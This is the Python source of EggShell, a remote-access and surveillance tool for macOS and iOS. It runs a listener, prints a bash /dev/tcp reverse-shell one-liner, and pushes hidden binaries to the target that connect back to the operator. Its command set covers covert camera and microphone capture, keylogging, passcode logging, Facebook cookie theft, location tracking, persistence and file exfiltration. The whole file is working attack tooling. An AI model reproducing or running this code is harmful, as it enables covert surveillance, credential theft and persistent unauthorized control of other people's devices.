#!/usr/bin/python
#EggShell
#Created By lucas.py 8-18-16
debug = 0

import base64
import binascii
import os
import random
import string
import socket
import sys
import time
from StringIO import StringIO
from threading import Thread
from src.encryption.ESEncryptor import ESEncryptor

#MARK: Globals
shellKey = ''.join((random.choice(string.letters+string.digits+"*")) for x in range(32))
terminator = ''.join((random.choice(string.letters+string.digits+"*")) for x in range(16))
escrypt = ESEncryptor(shellKey,16)
sessions = {}

#MARK: UI
RED = '\033[1;91m'
ENDC = '\033[0m'
UNDERLINE_GREEN = '\033[4;92m'
GREEN = '\033[1;92m'
WHITE = '\033[0;97m'
WHITEBU = '\033[1;4m'
COLOR_INFO = '\033[0;36m'
NES = '\033[4;32m'+"NES"+WHITE+"> "
BANNER_ART_TEXT = GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `          """+RED+"""
 _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
|_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                    l
"""+WHITE+"\nVersion: 2.0.9\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
    1): Start Server
    2): Start Multi Session
    3): Create Payload
    4): Exit
""" + WHITE + "-"*40
BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES



def interactiveMenu():
    while 1:
        os.system('clear')
        option = raw_input(BANNER)
        choose = {
            "1" : menuStartServer,
            "2" : menuStartMultiServer,
            "3" : menuCreateScript,
            "4" : menuExit
        }
        try:
            choose[option]()
            os.system('clear')
        except KeyError:
            continue

#generate key/define global

#binary key is used to decrypt the encrypted shell key, exists inside binaries as well
binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"

#TODO: should really take out whitespace eventually
def encryptStr(string,cypter=escrypt):
    length = len(string)
    result = ""
    x = 0
    while x < length:
        chunk = string[x:x+12]
        result += cypter.encode(chunk)
        x+=12
    return result


#MARK: String Formatting/Convenience
def strinfo(this):
    return COLOR_INFO+"[*]  " + WHITE + this

def bben(data):
    return base64.b64encode(data)

def bbde(data):
    return base64.b64decode(data)

def showLocalHelp():
    print WHITEBU+"Local Commands:"+"\n"+ENDC
    showCommand("lls","list contents of local directory")
    showCommand("lcd","change local directories")
    showCommand("lpwd","get current local directory")
    showCommand("lopen","open local directory")
    showCommand("clear","clears terminal")
    print ""

def showCommand(cmd,desc):
    print cmd + " " * (15 - len(cmd)) + ": " + desc

def showHelp(CDA):
    if "i386" in CDA:
        showLocalHelp()
        print WHITEBU+"OS X Commands:"+"\n"+ENDC
        showCommand("ls","list contents of directory")
        showCommand("cd","change directories")
        showCommand("rm","delete file")
        showCommand("pwd","get current directory")
        showCommand("download","download file")
        showCommand("picture","take picture through iSight camera")
        showCommand("getpid","get process id")
        showCommand("openurl","open url through the default browser")
        showCommand("idletime","get the amount of time since the keyboard/cursor were touched")
        showCommand("getpaste","get pasteboard contents")
        showCommand("mic","record microphone")
        showCommand("brightness","adjust screen brightness")
        showCommand("getfacebook","attempt to retrieve facebook cookie")
        showCommand("exec","execute command")
        showCommand("encrypt","encrypt file")
        showCommand("decrypt","decrypt file")
        showCommand("persistence","attempts to connect back every 60 seconds")
        showCommand("rmpersistence","removes persistence")
        print ""
    if "arm" in CDA:
        showLocalHelp()
        print WHITEBU+"iOS Commands:"+"\n"+ENDC
        showCommand("sysinfo","get system information")
        showCommand("ls","list contents of directory")
        showCommand("cd","change directories")
        showCommand("rm","delete file")
        showCommand("pwd","get current directory")
        showCommand("download","download file")
        showCommand("frontcam","take picture through front camera")
        showCommand("backcam","take picture through back camera")
        showCommand("mic","record microphone")
        showCommand("getpid","get process id")
        showCommand("vibrate","make device vibrate")
        showCommand("alert","make alert show up on device")
        showCommand("say","make device speak")
        showCommand("locate","get device location")
        showCommand("respring","respring device")
        showCommand("setvol","set mediaplayer volume")
        showCommand("getvol","view mediaplayer volume")
        showCommand("isplaying","view mediaplayer info")
        showCommand("openurl","open url on device")
        showCommand("dial","dial number on device")
        showCommand("battery","get battery level")
        showCommand("lastapp","get bundle id of last app opened")
        showCommand("listapps","list bundle identifiers")
        showCommand("open","open app")
        showCommand("persistence","installs LaunchDaemon - tries to connect every 30 seconds")
        showCommand("rmpersistence","uninstalls LaunchDaemon")
        showCommand("installpro","installs eggshellpro to device")
        print "\n"+WHITEBU+"eggshellPro Commands:"+"\n"+ENDC
        showCommand("lock","simulate lock button press")
        showCommand("wake","wake device from sleeping state")
        showCommand("home","simulate home button press")
        showCommand("doublehome","simulate home button double press")
        showCommand("play","plays music")
        showCommand("pause","pause music")
        showCommand("next","next track")
        showCommand("prev","previous track")
        showCommand("togglemute","programatically toggles silence switch")
        showCommand("ismuted","check if we are silenced or not")
        showCommand("islocked","check if device is locked") #there are ways to get around this, (alwaysunlock) tweak
        showCommand("getpasscode","log successfull passcode attempts")
        showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
        showCommand("keylog","log keystrokes") #not working inside apps...yet
        showCommand("keylogclear","clear keylog data")
        showCommand("locationservice","turn on or off location services")
        print ""

def lopen(command):
    if len(command.split()) == 1:
        print "Usage: lopen localdirectory"
    else:
        os.system('open ' + command.replace("lopen ",""))

def lls(command):
    if len(command.split()) == 1:
        os.system('ls')
    else:
        os.system('ls ' + command.replace("lls ",""))

def lcd(command):
    if len(command.split()) == 1:
        print "Usage: lcd localdirectory"
    else:
        try:
            os.chdir(command.split()[1])
        except:
            print strinfo("directory not found")

#MARK: Interactive Shell

def initSHELL(name,conn,host,port,CDA):
    while 1:
        command = ""
        try:
            command = raw_input(name) #raw
        except KeyboardInterrupt:
            print ""
            return -1
        
        args = command.split() #split

        try: #fixed crash if you type " "
            v = args[0]
        except:
            continue
    
        if not command:
            continue
        
        #exclusive commands
        if "arm" in CDA:
            if args[0] == "alert":
                title = bben(raw_input("Set title: "))
                message = bben(raw_input("Set message: "))
                sendCMD(args[0] + " " + title + " " + message,conn)
                continue
        if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
            conn.send(encryptStr(command))
            downloadFile(command,conn)
            continue
        if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
            downloadFile(command,conn)
        elif args[0] == "installpro":
            uploadFile("src/binaries/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
        elif args[0] == "help":
            showHelp(CDA)
        elif args[0] == "clear":
            os.system('clear');
        elif args[0] == "lopen":
            lopen(command)
            continue
        elif args[0] == "lls":
            lls(command)
            continue
        elif args[0] == "lcd":
            lcd(command)
            continue
        elif args[0] == "lpwd":
            os.system('pwd')
            continue
        elif args[0] == "alert":
            title = bben(raw_input("Set title: "))
            message = bben(raw_input("Set message: "))
            sendCMD(args[0] + " " + title + " " + message,conn)
        elif args[0] == "back" and len(sessions) > 0:
            return
        elif args[0] == "exit":
            return -1
        else:
            sendCMD(command,conn)

def sendCMD(cmd,conn):
    conn.send(encryptStr(cmd))
    try:
        data = receiveString(conn)
        if data != "":
            print data
    except:
        print receiveString(conn)
        print "connection was reset"
        conn.close()
        exit()

def receiveString(conn):
#    try:
        data = ""
        while 1:
            data += conn.recv(2048)
            if not data:
                return "we fucked up"
            #terminator to notify when we are done receiving data
            #useful for getting however much data we want
            if terminator in data:
                data = data.replace(terminator,"")
                result = bbde(escrypt.decode(data))
                if result == "-1":
                    result = "invalid command"
                return result
#    except:
#        return "error getting return value"


#MARK: File Transfers
def uploadFile(fileName,location,conn):
    #filedata
    f = open(fileName,"r")
    fileData = bben(f.read())
    f.close()
    
    #size
    filesize = str(sys.getsizeof(fileData))
    print "Uploading "+fileName
    print "Size = "+filesize
    
    #send cmd
    conn.send(encryptStr("installpro "+filesize))
    
    #sendfile
    conn.send(fileData+terminator)
    conn.recv(1024)

    #get result
    print "Finished"


def downloadFile(command,conn):
    #send download command
    conn.send(encryptStr(command))
    args = command.split()
    
    #receive file size
    try:
        sizeofFile = int(receiveString(conn))
    except:
        print "oops, couldnt get file size"
        return
    if sizeofFile == -1:
        print "file does not exist"
        return
    elif sizeofFile == -2:
        print "thats a directory"
        return
    elif sizeofFile == -3:
        print "error taking photo :/"
        return
    print strinfo("file size: "+str(sizeofFile))

    #filename to write to
    filename = ""
    dateFormat = "%Y%m%d%H%M%S"
    if args[0] == "screenshot":
        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "picture":
        filename = "isight"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "frontcam":
        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "backcam":
        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "mic":
        filename = "mic"+time.strftime(dateFormat)+".aac"
    else:
        filename = command[9:]

    progress = 0
    file = open(os.getcwd()+"/.tmpfile", "a+b")
    #read stream into file
    while 1:
        #TODO: there is a small chance EOF will be miss-aligned, need to fix this
        chunk = conn.recv(1024)
        progress += len(chunk)
        #Show progress
        if progress > sizeofFile:
            progress = sizeofFile
        sys.stdout.write("\r"+strinfo(WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
        #write to file
        if terminator in chunk:
            print ""
            #replace our endoffile keyword
            chunk = chunk.replace(terminator,"")
            #write the remaining chunk
            file.write(chunk)
            file.close()
            #decrypt with our shell key, remove tmp file
            downloadedFile = open(filename,"wb")
            downloadedFile.close()
            if not escrypt.decryptFile(os.getcwd()+"/.tmpfile", filename, shellKey, sizeofFile):
                print strinfo("error decrypting data :(")
            os.remove(os.getcwd()+"/.tmpfile")
            print strinfo("Finished Downloading!")
            return
        else:
            file.write(chunk)

#MARK: Server Functions

def getip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
        return host
    except:
        return "127.0.0.1"

def singleServer(host,port):
    session = SessionHandler()
    try:
        session.listen(1,host,port)
    except KeyboardInterrupt:
        return
    if session.conn and initSHELL(session.name,session.conn,session.host,session.port,session.CDA) == -1:
            print strinfo("closing connection")
            session.conn.close
            time.sleep(0.5)
    else:
        raw_input("")

def promptHostPort():
    lhost = getip()
    lport = 4444
    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
    if hostChoice != "":
        lhost = hostChoice
    print strinfo("LHOST = " + lhost)
    portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
    if portChoice != "":
        lport = portChoice
    print strinfo("LPORT = " + str(lport))
    return [lhost,lport]

def promptServerRun(host,port):
    if raw_input(NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(NES+"Multi Server? (y/N): ") == "y":
            bgserver = Thread(target = multiServer, args=(host,port))
            bgserver.daemon=True
            bgserver.start()
            time.sleep(0.01)
            multiServerController(port,bgserver)
            bgserver.join()
        else:
            singleServer(host,port)

#MARK: Menu Functions

def menuStartServer(): #1
    sp = promptHostPort()
    singleServer(sp[0],sp[1])

def menuStartMultiServer(): #2
    sp = promptHostPort()
    bgserver = Thread(target = multiServer, args=(sp[0],sp[1]))
    bgserver.daemon=True
    bgserver.start()
    time.sleep(0.01)
    multiServerController(sp[1],bgserver)
    bgserver.join()

def menuCreateScript(): #3
    sp = promptHostPort()
    print COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+ENDC
    promptServerRun(sp[0],sp[1])

def menuExit(): #4
    exit()

class SessionHandler:
    def __init__(self):
        self.name = ""
        self.uid = ""
        self.conn = ""
        self.s = ""
        self.host = ""
        self.port = ""
        self.CDA = ""
    
    def listen(self,verbose,host,port):
        self.host = host
        self.port = port
        INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey+" "+terminator,ESEncryptor(binaryKey,16)))
        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        if verbose:
            print strinfo("Listening on port "+str(port)+"...")
        
        #SEND/RECEIVE ARCH
        conn, addr = s.accept()
        hostAddress = addr[0]
        if verbose:
            print strinfo("Connecting to "+hostAddress)
        conn.send(INSTRUCT_STAGER)
        CDA = conn.recv(128)

        #CHOOSE/SEND BINARY
        payload = ""
        preload = ""
        if "armv7l" in CDA:
            CDA = "Linux"
        
        if "i386" in CDA:
            if verbose:
                print strinfo("Detected OSX")
            binaryFile = open("src/binaries/esplosx", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
        elif "arm" in CDA:
            if verbose:
                print strinfo("Detected iOS")
            binaryFile = open("src/binaries/esplios", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /usr/bin/.espl 2> /dev/null;cat >/usr/bin/.espl;chmod +x /usr/bin/.espl;/usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
        elif "Linux" in CDA:
            if verbose:
                print strinfo("Detected Linux, this isn't supported yet")
            conn.close()
            exit()
            return
            binaryFile = open("src/binaries/esplinux", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
        else:
            if verbose:
                print strinfo("device unrecognized")
                print CDA
            conn.close();
            return
        
        if verbose:
            print strinfo("Sending Payload")
        conn.send(preload)
        conn.send(payload)
        conn.close() #only one blink!
    
        if verbose:
            print strinfo("Waiting For Connection...")
        conn, hostAddress = s.accept()
        data = receiveString(conn)

        if data: #payload should return the name of the device and we will use that as our prompt
            self.uid = data.split(" ")[0]
            data = data.replace(self.uid+" ","")
            name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
            #spawn our interactive shell
            self.name = name
            self.conn = conn
            self.CDA = CDA
            s.close()
            return [name,conn,host,port,CDA]

#MARK: MultiServer

def multiServer(host,port):
    x = 1
    strinfo("Starting Background Multi Server on "+str(port)+"...")
    print "type \"help\" for MultiServer commands"
    while 1:
        newsession = SessionHandler()
        newsession.listen(0,host,port)
        skip = 0
        for sx in sessions:
            if newsession.uid == sessions[sx].uid:
                newsession.conn.close()
                skip = 1
                continue
        if skip:
            continue
        sessions[x] = newsession
        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] +
                         WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
        sys.stdout.flush()
        x += 1

def multiServerSessionInteract(args):
    if len(args) == 2:
        try:
            s = sessions[int(args[1])]
            if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
                multiServerSessionClose(args)
        except:
            print strinfo("Session not found")

def multiServerSessionClose(args):
    if len(args) == 2:
        x = int(args[1])
        try:
            s = sessions[x]
            s.conn.close()
            del sessions[x]
            print strinfo("Session closed")
        except:
            print strinfo("Session not found")

def multiServerListSessions():
    for key,value in sessions.iteritems():
        if value.name:
            print "Session [" + str(key) + "] | " + value.name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + value.conn.getpeername()[0]

#TODO: finish this function lol
def multiServerExit(bgserver):
    #clean up
    for key,value in sessions.iteritems():
        if value.name:
            try:
                s = sessions[key]
                s.conn.close()
            except:
                pass
    sessions.clear()
    exit()


def multiServerHelp():
    print WHITEBU+"MultiSession Commands:"+"\n"+ENDC
    showCommand("interact","interact with session, Usage: interact (session number)")
    showCommand("close","close session, Usage: close (session number)")
    showCommand("sessions","list current active sessions")
    showCommand("back","go back to MultiSession menu from session")
    print ""

def multiServerController(port,bgserver):
    while 1:
        input = raw_input(WHITE+""+COLOR_INFO+"MultiSession"+WHITE+"> ")
        if not input:
            continue
        cmd = input.split()
        #commands
        if cmd[0] == "interact":
            multiServerSessionInteract(cmd)
        elif cmd[0] == "sessions":
            multiServerListSessions()
        elif cmd[0] == "close":
            multiServerSessionClose(cmd)
        elif cmd[0] == "help":
            multiServerHelp()
        elif cmd[0] == "exit":
            multiServerExit(bgserver)
            break
        else:
            print "invalid command"
    interactiveMenu()

def main():
    #main menu options
    try:
        interactiveMenu()
    except (KeyboardInterrupt, EOFError) as e:
        print ""

main()
